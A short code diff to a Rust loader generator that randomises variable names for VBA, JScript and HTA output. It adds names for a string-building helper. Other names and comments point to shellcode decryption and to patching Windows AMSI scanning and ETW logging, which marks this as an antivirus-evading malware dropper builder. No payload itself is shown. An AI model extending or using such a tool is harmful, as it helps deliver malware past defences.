@@ -273,6 +273,8 @@ fn build_context(config: &LoaderConfig) -> Context {
         "vba_lv_k32", "vba_lv_u32", "vba_lv_gcpos", "vba_lv_pt1", "vba_lv_pt2", "vba_lv_tstart",
         "vba_lv_schex", "vba_lv_keyhex", "vba_lv_k", "vba_lv_ki",
         "vba_lv_raw", "vba_lv_sc", "vba_lv_mem", "vba_lv_oldp",
+        // fn_build_str locals
+        "vba_lv_bs", "vba_lv_bi",
         // fn_amsi_patch helper locals
         "vba_lv_amsilib", "vba_lv_scanname", "vba_lv_amsibase", "vba_lv_scanaddr", "vba_lv_amsioldp",
         // fn_etw_patch helper locals
@@ -304,6 +306,8 @@ fn build_context(config: &LoaderConfig) -> Context {
         "jsc_lv_aa", "jsc_lv_at",
         // fn_etw helper locals
         "jsc_lv_ea", "jsc_lv_et", "jsc_lv_ef",
+        // fn_build_str locals
+        "jsc_lv_bs", "jsc_lv_bi",
     ] {
         vars.insert(k, rand_ident(7));
     }
@@ -329,6 +333,8 @@ fn build_context(config: &LoaderConfig) -> Context {
         "hta_lv_aa", "hta_lv_at",
         // fn_etw helper locals
         "hta_lv_ea", "hta_lv_et", "hta_lv_ef",
+        // fn_build_str locals
+        "hta_lv_bs", "hta_lv_bi",
     ] {
         vars.insert(k, rand_ident(7));
     }
